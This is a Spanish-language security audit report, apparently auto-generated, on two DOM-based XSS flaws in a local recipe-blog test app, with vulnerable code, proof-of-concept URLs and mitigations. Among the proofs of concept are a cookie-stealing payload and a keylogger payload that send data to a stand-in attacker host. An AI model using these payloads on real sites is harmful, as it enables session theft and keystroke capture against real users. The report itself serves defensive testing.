# Informe de Auditoría de Seguridad - Cross-Site Scripting (XSS)

**Objetivo:** http://web.dev.local:8082  
**Fecha:** 2026-04-25T12:47:51Z  
**Tipo de análisis:** Vulnerabilidades Cross-Site Scripting (XSS)  
**Resultado:** Vulnerabilidades encontradas y explotadas

---

## Resumen Ejecutivo

Se han identificado **dos vulnerabilidades de tipo Cross-Site Scripting (XSS)** en la aplicación web "Blog de Recetas" alojada en `http://web.dev.local:8082`. Ambas son vulnerabilidades DOM-based XSS, donde el código JavaScript del lado del cliente procesa entradas del usuario sin ningún tipo de sanitización o codificación antes de insertarlas en el DOM mediante `document.write()`.

| # | Tipo | Parámetro | Severidad |
|---|------|-----------|-----------|
| 1 | DOM-based XSS (Reflejado) | `search` | Alta |
| 2 | DOM-based XSS (Persistente via localStorage) | `name`, `comment` | Alta |

---

## Descripción de la Aplicación

La aplicación es un "Blog de Recetas" con:
- **Sección de búsqueda:** formulario GET con parámetro `search` que muestra resultados de recetas
- **Sección de comentarios:** formulario GET con parámetros `name` y `comment` que almacena comentarios en `localStorage` y los muestra en pantalla

---

## Vulnerabilidad 1: DOM-based XSS Reflejado en Búsqueda

### Descripción

El parámetro `search` de la URL es leído mediante `URLSearchParams.get('search')` y directamente concatenado en una llamada a `document.write()` sin ninguna codificación ni sanitización.

### Código Vulnerable

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');

if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
    // ...
}
```

### Prueba de Concepto (PoC)

**Payload básico:**
```
http://web.dev.local:8082/?search=<script>alert('XSS')</script>
```

**Payload alternativo (evasión de filtros):**
```
http://web.dev.local:8082/?search=<img src=x onerror=alert('XSS-Reflejado')>
```

**Payload de robo de cookies:**
```
http://web.dev.local:8082/?search=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### Impacto

- Ejecución arbitraria de JavaScript en el contexto del navegador de la víctima
- Robo de sesiones (cookies)
- Redirección a sitios maliciosos
- Phishing/defacement de la página
- Robo de datos del formulario

---

## Vulnerabilidad 2: DOM-based XSS Persistente (localStorage)

### Descripción

Los parámetros `name` y `comment` son leídos desde la URL, almacenados en `localStorage` sin sanitización, y posteriormente recuperados y escritos directamente en el DOM mediante `document.write()`. Esta vulnerabilidad es persistente porque el payload malicioso se almacena en el navegador y se ejecuta cada vez que el usuario visita la página.

### Código Vulnerable

```javascript
// Almacenamiento sin sanitización
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
}

// Renderizado sin sanitización
comments.forEach(function(c, index) {
    document.write('<div class="comment-author">' + c.name + '</div>');
    document.write('<div>' + c.comment + '</div>');
    // ...
});
```

### Prueba de Concepto (PoC)

**Payload en el nombre:**
```
http://web.dev.local:8082/?name=<img src=x onerror=alert('XSS-Stored-Name')>&comment=Comentario+normal
```

**Payload en el comentario:**
```
http://web.dev.local:8082/?name=Usuario&comment=<script>alert('XSS-Stored-Comment')</script>
```

**Payload de keylogger:**
```
http://web.dev.local:8082/?name=Atacante&comment=<script>document.onkeypress=function(e){new Image().src='http://attacker.com/log?k='+e.key}</script>
```

### Impacto

- Ejecución persistente de JavaScript en cada visita a la página
- El payload se ejecuta automáticamente sin requerir que la víctima haga clic en un enlace especial
- Afecta a todos los usuarios que visiten la página desde el mismo navegador donde se inyectó el payload
- Mayor persistencia que el XSS reflejado tradicional

---

## Análisis Técnico

### Causa Raíz

El problema fundamental es el uso de `document.write()` con datos no sanitizados:

1. **Sin codificación HTML:** Los caracteres especiales (`<`, `>`, `"`, `'`, `&`) no son codificados antes de insertarse en el DOM
2. **Sin Content Security Policy (CSP):** No existe cabecera CSP que limite la ejecución de scripts inline
3. **Uso de `document.write()`:** Método obsoleto y peligroso para insertar contenido dinámico

### Verificación HTTP

```
GET /?search=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E HTTP/1.1
Host: web.dev.local:8082
→ HTTP/1.1 200 OK
```

El servidor responde con 200 OK y el payload XSS se incluye en el HTML servido al cliente, donde es ejecutado por el motor JavaScript del navegador.

---

## Medidas de Mitigación

### Inmediatas

1. **Sanitizar entradas con codificación HTML:**
```javascript
function escapeHtml(text) {
    const div = document.createElement('div');
    div.appendChild(document.createTextNode(text));
    return div.innerHTML;
}
// Uso:
document.write('<p>Resultados para: <strong>' + escapeHtml(searchTerm) + '</strong></p>');
```

2. **Usar `textContent` o `innerHTML` con sanitización en lugar de `document.write()`:**
```javascript
const p = document.createElement('p');
p.textContent = 'Resultados para: ' + searchTerm;
document.getElementById('results').appendChild(p);
```

3. **Implementar Content Security Policy (CSP):**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

### A Largo Plazo

- Validar y sanitizar todas las entradas del usuario en el servidor antes de procesarlas
- Usar una librería de sanitización como DOMPurify para contenido HTML dinámico
- Implementar cabeceras de seguridad HTTP: `X-XSS-Protection`, `X-Content-Type-Options`
- Realizar auditorías de seguridad periódicas
- Capacitar al equipo de desarrollo en prácticas de seguridad OWASP

---

## Conclusión

La aplicación web presenta vulnerabilidades críticas de tipo **DOM-based XSS** en dos puntos de entrada distintos. La vulnerabilidad en el parámetro `search` permite ataques reflejados, mientras que las vulnerabilidades en los parámetros `name` y `comment` permiten ataques persistentes a través del almacenamiento local. Ambas vulnerabilidades han sido confirmadas y son explotables sin necesidad de autenticación. Se recomienda aplicar las medidas de mitigación descritas de forma inmediata.

---

*Informe generado automáticamente por análisis de seguridad - 2026-04-25T12:47:51Z*
